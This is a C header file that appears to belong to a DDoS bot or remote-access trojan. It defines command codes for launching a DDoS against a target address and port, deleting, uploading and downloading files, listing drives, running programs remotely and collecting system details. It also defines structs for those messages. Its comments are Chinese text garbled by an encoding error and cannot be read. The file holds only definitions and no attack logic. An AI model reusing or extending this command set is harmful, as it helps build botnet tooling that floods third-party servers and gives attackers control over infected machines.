//π≤”√Ω·ππÃÂŒƒº˛
//Code gt
#if !defined _CMD_
#define _CMD_

//π•ª˜
#define CDDOS 0x01

//Õ£÷π
#define C_STOP 0x02

//–∂‘ÿ
#define C_REMOVE 0x03

//œ‘ æ”≤≈Ã¡–±Ì
#define C_GETDRIVE 0x04

//œ‘ æŒƒº˛¡–±Ì
#define C_SHOWFILELIST 0x05

//Œƒº˛¥´ ‰
#define C_UPLOADFILE 0x06
#define C_DOWNLOADFILE 0x07

//…æ≥˝Œƒº˛
#define C_FILEDEL 0x08

//‘∂≥Ã‘À––Œƒº˛
#define C_REMOTERUN 0x09

//ªÒµ√œµÕ≥œÍœ∏–≈œ¢
#define C_SYSTEMINFO 0x15

typedef struct SYSINFO
{
	DWORD	yzm;
	int		ver;
	DWORD	cpu;
	DWORD	mem;
	char	cmname[100];
}SetSYSINFO;

typedef struct DDOS
{
	DWORD       msg_id;
	char		addr[255];
	int			port;
	int			time;
	int			xc;
	int			pt;
	char		wParam[256]; //Œƒº˛π‹¿Ì¥´ ‰œ˚œ¢
	int         lParam;//Œƒº˛¥´ ‰œ˚œ¢
}GETDDOS;

typedef struct _DRIVE_INFO
{
	char DriveName[10];
	int  nType;
	BOOL isEnd;
}DRIVE_INFO; //”≤≈ÃΩ·ππÃÂ

typedef struct _FILE_INFO
{
	char FileName[50];
	BOOL  isDirectory;
	BOOL isEnd;
}FILE_INFO;//Œƒº˛Ω·ππÃÂ

typedef struct GETSYSTEMINFO
{
	char	cpux[256];
	char	processor[128];
	char	mem[128];
	char	disk[128];
	char	time[128];
	char	biosversion[256];
}GETINFO;//œµÕ≥œÍœ∏–≈œ¢Ω·ππÃÂ

typedef struct _FILETRASFER_MSG
{
	DWORD		dwFinger;
	BOOL		isEnd;
	BYTE		wParam[4096];
}FILETRASFER_MSG;//Œƒº˛¥´ ‰Ω·ππÃÂ

#endif